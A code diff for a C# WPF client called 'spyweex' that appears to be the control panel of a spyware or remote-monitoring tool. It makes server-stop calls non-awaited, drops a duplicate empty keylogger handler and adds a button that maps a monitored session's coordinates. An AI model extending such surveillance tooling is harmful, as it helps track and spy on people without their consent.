@@ -82,7 +82,7 @@ namespace spyweex_client_wpf
         {
             if (_wxhtpServiceServer != null)
             {
-                await _wxhtpServiceServer.Stop();
+                _wxhtpServiceServer.Stop();
                 _wxhtpServiceServer = null;
             }
             _wxhtpServiceServer = new WxhtpServiceServer(Utils.GetAllLocalIPv4(NetworkInterfaceType.Wireless80211).FirstOrDefault(), 61234, ViewModelSession);
@@ -94,13 +94,16 @@ namespace spyweex_client_wpf
             await _wxhtpServiceServer.Run();
         }
 
-        private async void btnStop_Clicked(object sender, RoutedEventArgs e)
+        private void btnStop_Clicked(object sender, RoutedEventArgs e)
         {
             try
             {
-                var stopTask = _wxhtpServiceServer?.Stop();
-                if (stopTask != null) await stopTask;
+                //var stopTask = _wxhtpServiceServer?.Stop();
+                //if (stopTask != null) await stopTask;
+                _wxhtpServiceServer?.Stop();
                 _wxhtpServiceServer = null;
+                
+
                 LabelAppStatus.Content = string.Format("Server stopped");
             }
             catch (Exception ex)
@@ -192,11 +195,6 @@ namespace spyweex_client_wpf
 
         }
 
-        private void btnKeylogger_Clicked(object sender, ContextMenuEventArgs e)
-        {
-
-        }
-
         private void btnKeyLogger_Clicked(object sender, RoutedEventArgs e)
         {
 
@@ -227,6 +225,13 @@ namespace spyweex_client_wpf
 
         }
 
+        private void btnGeo_Clicked(object sender, RoutedEventArgs e)
+        {
+            string coords = ((ViewModel) DataContext).SelectedSession.Coords;
+            string geo_uri = string.Format("https://www.google.ru/maps/place/{0},{1}/", coords.Split(',')[0], coords.Split(',')[1]);
+            System.Diagnostics.Process.Start(geo_uri);
+        }
+
         private void btnTelnet_Clicked(object sender, RoutedEventArgs e)
         {
 
@@ -241,6 +246,7 @@ namespace spyweex_client_wpf
         {
 
         }
+
     }
 }
 
